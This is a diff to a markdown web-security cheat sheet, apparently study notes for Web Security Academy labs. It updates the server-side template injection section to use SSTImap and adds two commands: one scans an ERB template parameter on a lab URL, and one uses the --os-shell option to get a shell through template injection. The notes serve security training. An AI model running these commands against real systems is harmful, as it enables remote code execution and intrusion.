@@ -186,11 +186,21 @@ Leverage [Python wrapper](https://github.com/Molx32/websec/blob/main/deserializa
 #### Others
 ### GraphQL API vulnerabilities
 ### Server-side template injection
-_Burp suite extensions : tplmap | SSTImap_
-Note : Burp suite scanner, including _Active Scan ++_ extension are not able to test for all SSTI vulnerabilities.
+_Burp suite extensions : None_
+_Third party tool : [SSTImap](https://github.com/vladko312/SSTImap)_
 
 #### Automated - Using SSTI Map
+```
+# Step 1 - Simple scan, injection being on *
+python3 sstimap.py -e ERB --url https://0a4600cd04e18ff880924e140087006a.web-security-academy.net/?message=*
+
+# Step 2 - Based on results, chose a payload, here OD shell
+python3 sstimap.py -e ERB --url https://0a4600cd04e18ff880924e140087006a.web-security-academy.net/?message=* --os-shell
+```
 #### Manual - Intruder
+
+
+#### Manual - Second order
 
 ### Web cache poisoning
 ### HTTP Host header attacks
